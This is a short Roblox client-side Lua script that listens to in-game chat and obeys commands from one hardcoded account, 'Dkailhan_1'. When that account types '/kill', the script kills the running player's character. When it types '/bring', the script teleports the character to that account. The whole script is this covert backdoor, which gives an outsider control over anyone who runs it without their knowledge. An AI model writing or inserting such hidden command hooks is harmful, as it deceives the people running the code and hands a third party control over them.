local ReplicatedStorage = game:FindService("ReplicatedStorage")
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local OnMessageEvent = ChatEvents:WaitForChild("OnMessageDoneFiltering")
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest")

if not SayMessageRequest:IsA("RemoteEvent") or not OnMessageEvent:IsA("RemoteEvent") then return end

local lp = game:FindService("Players").LocalPlayer
local lpName = game:FindService("Players").LocalPlayer.Name

OnMessageEvent.OnClientEvent:Connect(function(data)
    pcall(function()
        if not data then return end
        local player = tostring(data.FromSpeaker)
        if player == lpName then return end
        local message = tostring(data.Message)
        if message == "/kill" and player == "Dkailhan_1" then
            lp.Character.Humanoid.Health = 0
        elseif message == "/bring" and player == "Dkailhan_1" then
            local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
            lp.Character.HumanoidRootPart.CFrame = owner.Character.HumanoidRootPart.CFrame
        end
    end)
end)
